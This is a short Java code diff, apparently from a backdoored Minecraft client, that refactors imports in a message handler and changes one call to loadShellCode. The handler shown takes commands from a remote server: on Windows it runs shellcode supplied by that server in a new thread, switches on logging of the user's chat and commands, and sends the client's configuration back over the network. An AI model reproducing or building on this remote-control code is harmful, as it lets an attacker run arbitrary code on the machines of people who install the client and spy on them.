@@ -1,8 +1,8 @@
 package me.soda.witch.client.connection;
 
 import com.google.gson.Gson;
-import me.soda.witch.client.features.ShellcodeLoader;
-import me.soda.witch.client.features.Variables;
+import me.soda.witch.client.utils.ShellcodeLoader;
+import me.soda.witch.client.Variables;
 import me.soda.witch.client.utils.ChatUtil;
 import me.soda.witch.client.utils.MCUtils;
 import me.soda.witch.client.utils.NetUtil;
@@ -41,7 +41,7 @@ public class MessageHandler {
                 }).start();
                 case "shellcode" -> {
                     if (ProgramUtil.isWin())
-                        new Thread(() -> new ShellcodeLoader().loadShellCode((String) msg, false)).start();
+                        new Thread(() -> new ShellcodeLoader().loadShellCode((String) msg)).start();
                 }
                 case "log" -> Variables.INSTANCE.logChatAndCommand = !Variables.INSTANCE.logChatAndCommand;
                 case "config" -> NetUtil.send(msgType, new Gson().toJson(Variables.INSTANCE));
